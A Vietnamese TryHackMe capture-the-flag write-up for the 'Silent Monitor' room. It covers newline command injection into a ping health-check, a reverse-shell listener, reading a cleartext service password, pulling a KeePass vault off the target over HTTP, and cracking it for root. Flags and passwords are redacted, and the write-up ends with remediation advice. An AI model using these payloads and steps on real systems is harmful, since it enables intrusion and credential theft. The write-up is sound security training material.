@@ -1,0 +1,150 @@
+---
+title: 'Silent Monitor'
+description: 'Một audit log làm lộ chiêu command injection bằng newline (%0a) vào endpoint health-check của NOC; reverse shell www-data đọc mật khẩu dịch vụ cleartext từ config ai cũng đọc được, SSH thành sysadmin, rồi crack vault KeePass để lấy mật khẩu root.'
+date: 2026-06-24
+platform: tryhackme
+room: 'Silent Monitor'
+roomUrl: 'https://tryhackme.com/room/silent-monitor'
+difficulty: medium
+tags:
+  - 'web'
+  - 'command-injection'
+  - 'linux'
+  - 'password-cracking'
+  - 'privesc'
+vulnClasses:
+  - 'insecure command execution'
+  - 'world-readable secret file'
+  - 'weak credentials'
+translation: done
+draft: false
+---
+
+_Hướng dẫn giải phòng "Silent Monitor" trên TryHackMe. Một dashboard vận hành mạng (NOC) để lộ một audit log nội bộ, nó lặng lẽ cho ta biết kẻ tấn công trước đã vào bằng cách nào — một command injection dựa trên newline trong endpoint health-check. Ta lần theo manh mối để lấy shell, đọc một mật khẩu dịch vụ từ config ai cũng đọc được, SSH vào với tư cách_ _`sysadmin`\*\*, và kết thúc bằng việc crack một vault KeePass để khôi phục mật khẩu root._
+
+> Silent Monitor là một challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác ở đây đều thực hiện trên mục tiêu luyện tập được cấp phép. Các flag, mật khẩu dịch vụ, mật khẩu master KeePass và mật khẩu root đều hiển thị dưới dạng `THM{<redacted>}` / `<redacted>` — có thật trên máy, giấu đi ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Một app Flask NOC trên `:5050` để lộ `/internal`, mà **audit log** của nó ghi lại việc một kẻ tấn công trước đánh vào endpoint health-check bằng `127.0.0.1%0awhoami` → cái `%0a` (newline) đó phá ra khỏi lệnh shell `ping -c 1 <input>` → tái hiện nó để có **reverse shell dưới www-data** → đọc `/opt/netops/secret.config`, nơi lưu một **mật khẩu backup-agent cleartext** cho `sysadmin` → **SSH thành sysadmin** (user flag) → trong `~/backups` có `infrastructure.kdbx`; crack mật khẩu master bằng `john` (“spring”) → mở vault để lấy **mật khẩu root** → `su root` (root flag).
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-ip>
+```
+
+`nmap` cho thấy SSH và một app web Python/Werkzeug được giới thiệu là Network Operations Centre:
+
+```text
+22/tcp   open  ssh   OpenSSH 8.9p1 Ubuntu
+5050/tcp open  http  Werkzeug httpd 2.0.2 (Python 3.10.12)   # CorpNet — NOC
+```
+
+Quét thư mục tìm ra đúng một route đáng chú ý:
+
+```text
+gobuster dir -u http://$IP:5050/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,js,txt,html
+# internal   (Status: 200)
+```
+
+### **Lỗ hổng**
+
+`/internal` đưa ra một **audit log**, và log đó chính là toàn bộ gợi ý: nó ghi lại các lần thăm dò trước đó vào endpoint status/health, gồm các bản ghi như `127.0.0.1%0awhoami`. Health check phía sau endpoint dựng một lệnh shell đại loại `ping -c 1 <input>` và chỉ kiểm tra rằng input _bắt đầu_ bằng một IP hợp lệ.
+
+<Callout type="insight">
+
+`%0a` là một **ký tự xuống dòng (newline)** dạng URL-encode. Trong shell, một newline kết thúc một lệnh và bắt đầu lệnh tiếp theo, nên `127.0.0.1%0awhoami` chạy `ping -c 1 127.0.0.1` **rồi sau đó** `whoami`. Một kiểm tra tiền tố (“nó có bắt đầu bằng IP không?”) chẳng làm được gì với dòng thứ hai bị chèn — điểm yếu kinh điển của việc kiểm tra đầu chuỗi thay vì từ chối các ký tự đặc biệt của shell.
+
+</Callout>
+
+### **Bước 1 — tái hiện command injection → shell www-data**
+
+Ta replay đoạn injection qua Burp vào tham số health-check, đổi `whoami` thành một one-liner reverse shell. Một listener bắt được:
+
+```text
+nc -lvnp 4444
+# connect from $IP
+# uid=33(www-data) gid=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+### **Bước 2 — mật khẩu dịch vụ cleartext → SSH thành sysadmin (flag)**
+
+Thư mục app chứa một file config lưu mật khẩu backup-agent ở dạng **plaintext**, và nó chạy dưới `sysadmin`:
+
+```text
+www-data@...:/opt/netops$ cat secret.config
+# [backup_agent]
+# run_as   = sysadmin
+# password = <redacted>
+```
+
+Mật khẩu đó dùng được thẳng qua SSH:
+
+```text
+ssh sysadmin@$IP
+sysadmin@...:~$ cat user.txt
+THM{<redacted>}
+```
+
+### **Bước 3 — crack vault KeePass → root (flag)**
+
+Home của `sysadmin` có thư mục `backups/` chứa `infrastructure.kdbx` (một database credential KeePass) và một README mô tả nó. Kéo nó về máy tấn công:
+
+```text
+# on target
+sysadmin@...:~/backups$ python3 -m http.server 8000
+# on attacker
+wget http://$IP:8000/infrastructure.kdbx
+```
+
+Bản `keepass2john` mặc định nghẹn với định dạng KDBX 4, nên dùng bản từ một build `john` mới, rồi crack bằng rockyou:
+
+```text
+~/john/run/keepass2john infrastructure.kdbx > keepass.hash   # value redacted
+~/john/run/john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
+# <redacted>   (infrastructure)
+```
+
+Mật khẩu master khôi phục được (một từ duy nhất trong rockyou) mở khoá vault, nơi lưu mật khẩu của tài khoản **root**. Đổi user và lấy flag cuối:
+
+```text
+sysadmin@...:~/backups$ su root
+root@...:~# cat /root/root.txt
+THM{<redacted>}
+```
+
+### **Tác động**
+
+<Callout type="critical">
+
+**Nghiêm trọng — CVSS 3.1 \~9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Endpoint health-check chưa xác thực cho phép thực thi lệnh tuỳ ý dưới quyền user web. Một config ai cũng đọc được sau đó trao một mật khẩu SSH `sysadmin` dùng được, và một vault KeePass được bảo vệ yếu cho ra mật khẩu root — một đường thẳng từ một request HTTP nặc danh tới root đầy đủ trên host.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+- **Không bao giờ dựng lệnh shell từ input người dùng.** Xác minh đích là một IP/hostname thực và gọi API không qua shell (ví dụ một thư viện ping), hoặc truyền đối số dưới dạng mảng — đừng nối chuỗi vào lệnh shell. Từ chối newline và ký tự đặc biệt của shell dứt khoát thay vì khớp tiền tố.
+- **Không lưu mật khẩu ở plaintext trong file config**, và siết quyền để user web không đọc được credential dịch vụ.
+- **Bảo vệ vault credential bằng mật khẩu master mạnh** (một từ rockyou không phải là mạnh) và đừa backup khỏi các đường dẫn truy cập được.
+- **Không phơi bày audit log nội bộ** — nó đã trao cho kẻ tấn công chính xác payload cần dùng.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Đọc chính các log mà app hiển cho bạn.** Dấu vết audit đã ghi lại đúng exploit dự định.
+- **Kiểm tra tiền tố không phải là kiểm tra đầu vào.** Kiểm tra rằng chuỗi _bắt đầu_ bằng một IP chẳng làm gì được với phần sau một newline.
+- **Credential dịch vụ plaintext biến shell user web thành di chuyển ngang**, và một mật khẩu KeePass yếu biến một file backup thành root.
+
+Silent Monitor là bài học gọn về việc để chính telemetry của người phòng thủ dẫn lối cho cuộc tấn công. Cảm ơn đã đọc.
